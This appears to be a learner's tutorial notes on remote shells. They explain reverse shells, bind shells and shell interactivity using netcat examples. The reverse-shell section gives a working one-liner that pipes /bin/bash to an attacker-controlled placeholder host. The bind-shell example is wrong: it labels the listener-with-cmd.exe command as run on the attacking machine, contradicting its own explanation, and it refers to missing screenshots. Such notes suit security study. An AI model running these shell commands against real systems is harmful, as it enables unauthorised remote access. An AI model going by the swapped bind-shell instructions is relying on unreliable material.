 When targeting remote systems it is sometimes possible to force an app running on the server to execute arbitrary code. When this happens, such initial access is used to obtain shell running on the target.  
  
 Types of shells:  
   
 1. Reverse shell - target is forced to execute commands that connects back to your computer.. This process requires to set up a listener which is used t receive connection.   
   
Reverse shells are good way to bypass firewall rules, that may prevent from connecting to arbitrary ports on the target. However the drawback is that when receiving a shell from a machine across the network, personal computer need to be configured in a way that supports accepting such shell.  
  
Example:  
  
Most of reverse shells are obtain in such way. Left picture is a listener - that is what receives the connection. On the right is a simulation of sending a reverse shell (normally it's done by code injection or something similiar). Left is our own computer. Right is target machine.  
  
Code executed on attacking machine:  
  
sudo nc -lvnp 443  
  
Code executed on target:  
  
nc <LOCAL-IP> <PORT> -e /bin/bash

After running reverse shell on target the listener receives a connection. Most important about this method is to remember that **listening** is on our own computer, and we are sending a command **from** the target.  
  
 2. Bind shell - is when the code executed on a target is used to start a listener attached to a shell directly on the target. This would then be opened up to the internet, meaning you can  
 connect to the port that the code has opened and obtain remote code execution that way.   
   
 They are less common, than reverse shell.  
  
 Example:  
   
On left is attacking computer, on right target machine. In this example a Windows target is showed. First task is to start listener on the target with “cmd.exe” which tells to connect to our own machine on completely new port.  
  
Code executed on attacking machine:  
  
nc -lvpn <PORT> -e “cmd.exe”  
  
Code executed on target:  
  
nc MACHINE\_IP <PORT>

 Shell are also divided by another category, which is interactivity.  
   
 - interactive - using Poweshell, bash, sh or any other standard CLI environment we are using interactive shell. It allows to interact with programs after executing them. For example a SSH  
 login:

 Which asks interactively user for answer (Y, N, fingerprint). It's an interactive program which needs interactive shell to run.  
   
 - non-interactive - they limit user to use programs which do not require user interaction in order to run properly. Unfortunately most of simple reverse shells and bind shells anr non-interactive, which make further expoitation harder. Same example of SHH login:

 “whoami” command which doesn't require user feedback works fine. But SSH which requires user to input login credentials is empty.
